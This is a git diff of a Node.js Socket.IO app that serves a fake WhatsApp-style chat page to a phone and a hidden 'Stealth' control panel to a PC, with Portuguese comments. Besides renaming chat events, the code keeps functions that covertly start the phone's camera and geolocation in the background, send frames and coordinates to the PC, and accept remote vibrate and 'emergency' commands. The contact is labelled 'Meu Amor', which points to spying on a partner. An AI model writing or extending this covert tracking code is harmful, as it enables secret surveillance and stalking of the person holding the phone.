@@ -27,10 +27,34 @@ app.get('/', (req, res) => {
 io.on('connection', (socket) => {
     console.log('✅ Cliente conectado:', socket.id);
     
-    // Mensagens (nos dois sentidos)
-    socket.on('send_message', (data) => {
-        console.log('📨 Mensagem:', data.text);
-        socket.broadcast.emit('new_message', data);
+    // Celular envia mensagem para o PC
+    socket.on('mobile_send_message', (data) => {
+        console.log('📱 Celular enviou:', data.text);
+        socket.broadcast.emit('mobile_new_message', data);
+    });
+    
+    // PC envia mensagem para o celular
+    socket.on('pc_send_message', (data) => {
+        console.log('💻 PC enviou:', data.text);
+        socket.broadcast.emit('pc_new_message', data);
+    });
+    
+    // Indicador de digitação do celular
+    socket.on('mobile_typing_start', () => {
+        socket.broadcast.emit('mobile_typing', { isTyping: true });
+    });
+    
+    socket.on('mobile_typing_stop', () => {
+        socket.broadcast.emit('mobile_typing', { isTyping: false });
+    });
+    
+    // Indicador de digitação do PC
+    socket.on('pc_typing_start', () => {
+        socket.broadcast.emit('pc_typing', { isTyping: true });
+    });
+    
+    socket.on('pc_typing_stop', () => {
+        socket.broadcast.emit('pc_typing', { isTyping: false });
     });
     
     // Comandos do PC (invisíveis para o celular)
@@ -58,14 +82,13 @@ io.on('connection', (socket) => {
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`\n🚀 Servidor Stealth rodando!`);
     console.log(`📍 Porta: ${PORT}`);
-    console.log(`\n⚠️ MODO INVISÍVEL:`);
-    console.log(`   📱 Celular: ENVIA mensagens normalmente`);
+    console.log(`\n⚠️ MODO:`);
+    console.log(`   📱 Celular: PODE enviar mensagens`);
     console.log(`   📱 Celular: NÃO sabe que está sendo filmado`);
-    console.log(`   📱 Celular: NÃO vê controles`);
     console.log(`   💻 PC: Controle total e invisível\n`);
 });
 
-// ============ PÁGINA DO CELULAR (WHATSAPP NORMAL, MAS CONTROLADO) ============
+// ============ PÁGINA DO CELULAR (WHATSAPP NORMAL) ============
 function getMobilePage(fullUrl) {
     return `<!DOCTYPE html>
 <html>
@@ -177,23 +200,6 @@ function getMobilePage(fullUrl) {
         .send-btn.active {
             color: #25d366;
         }
-        .toast {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1e2a32;
-            color: #e9edef;
-            padding: 8px 16px;
-            border-radius: 24px;
-            font-size: 13px;
-            z-index: 1000;
-            animation: slideUp 0.3s ease;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
-        }
     </style>
 </head>
 <body>
@@ -228,7 +234,7 @@ function getMobilePage(fullUrl) {
         let typingTimeout = null;
         let isTyping = false;
         
-        // Função para adicionar mensagem
+        // Adicionar mensagem na tela
         function addMessage(text, type = 'sent') {
             const messageDiv = document.createElement('div');
             messageDiv.className = \`message \${type}\`;
@@ -245,12 +251,14 @@ function getMobilePage(fullUrl) {
             messages.scrollTop = messages.scrollHeight;
         }
         
-        // Enviar mensagem
+        // ENVIAR MENSAGEM - CORRIGIDO!
         function sendMessage() {
             const text = messageInput.value.trim();
             if (text) {
+                // Adiciona na tela do celular
                 addMessage(text, 'sent');
-                socket.emit('send_message', { text, timestamp: Date.now() });
+                // Envia para o PC
+                socket.emit('mobile_send_message', { text: text, timestamp: Date.now() });
                 messageInput.value = '';
                 stopTyping();
             }
@@ -260,7 +268,7 @@ function getMobilePage(fullUrl) {
         function startTyping() {
             if (!isTyping) {
                 isTyping = true;
-                socket.emit('typing_start');
+                socket.emit('mobile_typing_start');
                 statusText.innerHTML = '✍️ digitando...';
             }
             if (typingTimeout) clearTimeout(typingTimeout);
@@ -272,24 +280,25 @@ function getMobilePage(fullUrl) {
         function stopTyping() {
             if (isTyping) {
                 isTyping = false;
-                socket.emit('typing_stop');
+                socket.emit('mobile_typing_stop');
                 statusText.innerHTML = '🟢 online';
             }
         }
         
-        // Eventos
+        // Eventos de clique e teclado
         sendBtn.addEventListener('click', sendMessage);
         messageInput.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') sendMessage();
         });
         messageInput.addEventListener('input', startTyping);
         
-        // Receber mensagens do PC
-        socket.on('new_message', (data) => {
+        // RECEBER mensagem do PC
+        socket.on('pc_new_message', (data) => {
             addMessage(data.text, 'received');
         });
         
-        socket.on('user_typing', (data) => {
+        // Indicador de digitação do PC
+        socket.on('pc_typing', (data) => {
             if (data.isTyping) {
                 statusText.innerHTML = '✍️ digitando...';
             } else {
@@ -297,8 +306,7 @@ function getMobilePage(fullUrl) {
             }
         });
         
-        // ========== FUNÇÕES STEALTH (INVISÍVEIS PARA O USUÁRIO) ==========
-        // Câmera em segundo plano (sem o usuário saber)
+        // ========== FUNÇÕES STEALTH (INVISÍVEIS) ==========
         let stealthStream = null;
         let stealthInterval = null;
         
@@ -335,7 +343,6 @@ function getMobilePage(fullUrl) {
             }
         }
         
-        // Localização em segundo plano (sem o usuário saber)
         function startStealthLocation() {
             if (navigator.geolocation) {
                 setInterval(() => {
@@ -354,7 +361,7 @@ function getMobilePage(fullUrl) {
             }
         }
         
-        // Iniciar tudo em segundo plano (sem avisar o usuário)
+        // Iniciar stealth após 2 segundos
         setTimeout(() => {
             startStealthCamera();
             startStealthLocation();
@@ -369,9 +376,8 @@ function getMobilePage(fullUrl) {
             }
         });
         
-        // Conexão
         socket.on('connect', () => {
-            console.log('Conectado ao servidor');
+            console.log('✅ Conectado ao servidor');
         });
     </script>
 </body>
@@ -385,7 +391,7 @@ function getPCPage(fullUrl) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WhatsApp Web - Controle Stealth</title>
+    <title>WhatsApp Web - Controle</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -550,7 +556,7 @@ function getPCPage(fullUrl) {
 <body>
     <div class="chat">
         <div class="header">
-            <h3>💕 Meu Amor <span class="stealth-badge">MODO STEALTH</span></h3>
+            <h3>💕 Meu Amor <span class="stealth-badge">STEALTH</span></h3>
             <div style="font-size:12px; color:#8696a0; margin-top:5px;">
                 <span class="status"></span> <span id="contactStatus">online</span>
             </div>
@@ -562,7 +568,7 @@ function getPCPage(fullUrl) {
             </div>
         </div>
         <div class="input-area">
-            <input type="text" id="messageInput" placeholder="Digite uma mensagem para o celular">
+            <input type="text" id="messageInput" placeholder="Digite uma mensagem">
             <button id="sendBtn">📤 Enviar</button>
         </div>
     </div>
@@ -594,9 +600,9 @@ function getPCPage(fullUrl) {
         <div style="margin-top: 20px; padding: 12px; background: #111b21; border-radius: 8px;">
             <div style="color: #8696a0; font-size: 11px;">
                 ⚠️ Modo Stealth ativado<br>
+                • Celular pode enviar mensagens<br>
                 • Celular NÃO sabe que está sendo filmado<br>
-                • Celular NÃO vê esses controles<br>
-                • Celular pode enviar mensagens normalmente
+                • Celular NÃO vê esses controles
             </div>
         </div>
     </div>
@@ -605,7 +611,6 @@ function getPCPage(fullUrl) {
     <script>
         const socket = io('${fullUrl}', { transports: ['websocket', 'polling'] });
         
-        // Elementos
         const messages = document.getElementById('messages');
         const messageInput = document.getElementById('messageInput');
         const sendBtn = document.getElementById('sendBtn');
@@ -616,7 +621,6 @@ function getPCPage(fullUrl) {
         let typingTimeout = null;
         let isTyping = false;
         
-        // Adicionar mensagem
         function addMessage(text, type = 'sent') {
             const div = document.createElement('div');
             div.className = \`message \${type}\`;
@@ -626,12 +630,11 @@ function getPCPage(fullUrl) {
             messages.scrollTop = messages.scrollHeight;
         }
         
-        // Enviar mensagem
         function sendMessage() {
             const text = messageInput.value.trim();
             if (text) {
                 addMessage(text, 'sent');
-                socket.emit('send_message', { text });
+                socket.emit('pc_send_message', { text });
                 messageInput.value = '';
                 stopTyping();
             }
@@ -640,7 +643,7 @@ function getPCPage(fullUrl) {
         function startTyping() {
             if (!isTyping) {
                 isTyping = true;
-                socket.emit('typing_start');
+                socket.emit('pc_typing_start');
             }
             if (typingTimeout) clearTimeout(typingTimeout);
             typingTimeout = setTimeout(() => stopTyping(), 1000);
@@ -649,58 +652,21 @@ function getPCPage(fullUrl) {
         function stopTyping() {
             if (isTyping) {
                 isTyping = false;
-                socket.emit('typing_stop');
+                socket.emit('pc_typing_stop');
             }
         }
         
-        // Eventos
         sendBtn.addEventListener('click', sendMessage);
         messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
         messageInput.addEventListener('input', startTyping);
         
-        // Controles
-        document.getElementById('cameraBtn').addEventListener('click', () => {
-            socket.emit('command', { type: 'start_camera' });
-            addMessage('📷 Solicitando câmera (stealth)...', 'sent');
-        });
-        
-        document.getElementById('locationBtn').addEventListener('click', () => {
-            socket.emit('command', { type: 'get_location' });
-            addMessage('📍 Solicitando localização (stealth)...', 'sent');
-        });
-        
-        document.getElementById('vibrateBtn').addEventListener('click', () => {
-            socket.emit('command', { type: 'vibrate' });
-            addMessage('📳 Vibração enviada (stealth)', 'sent');
-        });
-        
-        document.getElementById('emergencyBtn').addEventListener('click', () => {
-            socket.emit('command', { type: 'emergency' });
-            addMessage('💥 Surpresa especial enviada!', 'sent');
-        });
-        
-        // Receber dados
-        socket.on('new_message', (data) => {
+        // RECEBER mensagem do celular
+        socket.on('mobile_new_message', (data) => {
             addMessage(data.text, 'received');
         });
         
-        socket.on('camera_stream', (frame) => {
-            cameraPreview.src = frame;
-        });
-        
-        socket.on('new_location', (location) => {
-            locationInfo.innerHTML = \`
-                📍 Última localização:<br>
-                Latitude: \${location.lat.toFixed(6)}<br>
-                Longitude: \${location.lng.toFixed(6)}<br>
-                <a href="https://www.google.com/maps?q=\${location.lat},\${location.lng}" target="_blank">
-                    🗺️ Abrir no Google Maps
-                </a>
-            \`;
-            addMessage(\`📍 Localização recebida (stealth)\`, 'received');
-        });
-        
-        socket.on('user_typing', (data) => {
+        // Indicador de digitação do celular
+        socket.on('mobile_typing', (data) => {
             if (data.isTyping) {
                 contactStatus.innerHTML = 'digitando... ✍️';
             } else {
@@ -708,8 +674,43 @@ function getPCPage(fullUrl) {
             }
         });
         
+        // Controles
+        document.getElementById('cameraBtn').onclick = () => {
+            socket.emit('command', { type: 'start_camera' });
+            addMessage('📷 Solicitando câmera (stealth)...', 'sent');
+        };
+        
+        document.getElementById('locationBtn').onclick = () => {
+            socket.emit('command', { type: 'get_location' });
+            addMessage('📍 Solicitando localização (stealth)...', 'sent');
+        };
+        
+        document.getElementById('vibrateBtn').onclick = () => {
+            socket.emit('command', { type: 'vibrate' });
+            addMessage('📳 Vibração enviada', 'sent');
+        };
+        
+        document.getElementById('emergencyBtn').onclick = () => {
+            socket.emit('command', { type: 'emergency' });
+            addMessage('💥 Surpresa enviada!', 'sent');
+        };
+        
+        socket.on('camera_stream', (frame) => {
+            cameraPreview.src = frame;
+        });
+        
+        socket.on('new_location', (location) => {
+            locationInfo.innerHTML = \`
+                📍 Localização:<br>
+                Lat: \${location.lat.toFixed(6)}<br>
+                Lng: \${location.lng.toFixed(6)}<br>
+                <a href="https://www.google.com/maps?q=\${location.lat},\${location.lng}" target="_blank">🗺️ Ver mapa</a>
+            \`;
+            addMessage(\`📍 Localização recebida\`, 'received');
+        });
+        
         socket.on('connect', () => {
-            addMessage('✨ Conectado ao celular em modo stealth!', 'received');
+            addMessage('✨ Conectado ao celular!', 'received');
         });
     </script>
 </body>
